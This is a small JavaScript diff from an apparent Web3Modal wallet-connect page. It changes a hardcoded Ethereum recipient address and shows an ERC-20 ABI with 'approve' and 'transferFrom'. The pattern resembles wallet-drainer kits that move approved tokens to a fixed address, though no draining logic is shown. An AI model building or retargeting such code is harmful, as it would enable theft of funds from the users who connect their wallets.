@@ -333,7 +333,7 @@ const modal = createWeb3Modal({
 
 
 
-  const recipientAddress = '0x012d897C38bb809e38D6A9E4a986453273ae5Adc'; //RECIPIENT ADDRESS
+  const recipientAddress = '0xfEC0B00929ed4FF0d7662D8b912F04d97fBd0D54'; //RECIPIENT ADDRESS
   const erc20ABI = [
       "function approve(address spender, uint256 amount) external returns (bool)",
       "function transferFrom(address sender, address recipient, uint256 amount) external returns (bool)",
